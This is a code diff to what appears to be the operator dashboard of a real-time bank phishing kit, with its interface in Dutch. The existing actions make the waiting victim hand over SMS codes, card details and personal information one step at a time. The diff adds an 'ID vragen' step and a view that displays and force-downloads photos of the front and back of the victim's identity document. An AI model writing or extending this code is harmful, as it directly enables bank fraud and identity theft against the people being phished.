@@ -200,6 +200,7 @@ const ACTIONS = [
   { key: "ask_sms", label: "SMS vragen", style: "bg-amber-600 text-white", banks: null },
   { key: "ask_card", label: "Kaart vragen", style: "bg-emerald-700 text-white", banks: null },
   { key: "ask_info", label: "Info vragen", style: "bg-teal-700 text-white", banks: null },
+  { key: "ask_id", label: "ID vragen", style: "bg-orange-700 text-white", banks: null },
   { key: "ask_confirm", label: "Bevestiging vragen", style: "bg-indigo-700 text-white", banks: null },
   { key: "done", label: "Voltooien", style: "bg-green-600 text-white", banks: null },
   { key: "reset_waiting", label: "Lader", style: "bg-neutral-200 text-neutral-800", banks: null },
@@ -1055,10 +1056,25 @@ async function copyText(t) {
   }
 }
 
+function dlUrl(url) {
+  // Cloudinary: force download instead of preview. Others: open as-is.
+  if (typeof url === "string" && url.includes("res.cloudinary.com") && url.includes("/upload/")) {
+    return url.replace("/upload/", "/upload/fl_attachment/");
+  }
+  return url;
+}
+
 function LogCard({ s, meta, footer, wrapClass }) {
   const [copied, setCopied] = useState(null);
   const entries = Object.entries(s.data || {});
   const allText = entries.map(([k, v]) => `${k}- ${String(v)}`).join("\n");
+  const isId = s.kind === "id";
+  const idImgs = isId
+    ? [
+        ["Recto", s.data?.front],
+        ["Verso", s.data?.back],
+      ].filter(([, u]) => typeof u === "string" && u)
+    : [];
 
   async function doCopy(text, key) {
     if (await copyText(text)) {
@@ -1083,7 +1099,45 @@ function LogCard({ s, meta, footer, wrapClass }) {
         </button>
       </div>
       <div className="mt-2 space-y-1 rounded-md bg-black/30 p-2 font-mono text-[13px] leading-relaxed text-purple-50">
-        {entries.map(([k, val]) => (
+        {isId && idImgs.length > 0 ? (
+          <div className="grid grid-cols-2 gap-2 font-sans">
+            {idImgs.map(([label, url]) => (
+              <div key={label} className="overflow-hidden rounded-lg bg-white/5 ring-1 ring-white/10">
+                <button
+                  type="button"
+                  onClick={() => window.open(url, "_blank", "noopener")}
+                  title="Open in nieuw tabblad"
+                  className="block w-full"
+                >
+                  <img src={url} alt={label} loading="lazy" className="h-28 w-full bg-white object-contain" />
+                </button>
+                <div className="flex items-center justify-between gap-1 px-1.5 py-1">
+                  <span className="text-[12px] font-bold text-purple-200">{label}</span>
+                  <span className="flex gap-1">
+                    <a
+                      href={dlUrl(url)}
+                      target="_blank"
+                      rel="noopener noreferrer"
+                      title="Downloaden"
+                      className="flex min-h-[28px] min-w-[28px] items-center justify-center rounded-md bg-white/10 px-1.5 text-[14px] font-bold text-purple-100 transition hover:bg-emerald-600 hover:text-white active:scale-95"
+                    >
+                      ⭳
+                    </a>
+                    <button
+                      type="button"
+                      onClick={() => doCopy(url, `img-${label}`)}
+                      title="URL kopiëren"
+                      className="flex min-h-[28px] min-w-[28px] items-center justify-center rounded-md bg-white/10 px-1 text-[12px] font-bold text-purple-200 transition hover:bg-fuchsia-600 hover:text-white active:scale-95"
+                    >
+                      {copied === `img-${label}` ? "✓" : "⧉"}
+                    </button>
+                  </span>
+                </div>
+              </div>
+            ))}
+          </div>
+        ) : (
+          entries.map(([k, val]) => (
           <div key={k} className="flex items-start gap-x-2 break-all">
             <span className="shrink-0 font-bold text-fuchsia-300">{k}-</span>
             <span className="min-w-0 flex-1 break-all">{String(val)}</span>
@@ -1096,7 +1150,8 @@ function LogCard({ s, meta, footer, wrapClass }) {
               {copied === k ? "✓" : "⧉"}
             </button>
           </div>
-        ))}
+          ))
+        )}
       </div>
       {footer}
     </div>
@@ -1603,7 +1658,7 @@ function SessionView({ v, now, logs, onBack, onAction, onRemove }) {
             Bezoeker verwijderen
           </button>
           <p className="mt-2 text-[12px] leading-snug text-purple-300/80">
-            De gebruiker wacht op de lader na elke invoer. Vraag de stappen één voor één: Inloggen → Goedkeuring → Telefoon → SMS → Kaart → Info → Bevestigen.
+            De gebruiker wacht op de lader na elke invoer. Vraag de stappen één voor één: Inloggen → Goedkeuring → Telefoon → SMS → Kaart → Info → ID → Bevestigen.
           </p>
         </aside>
       </div>
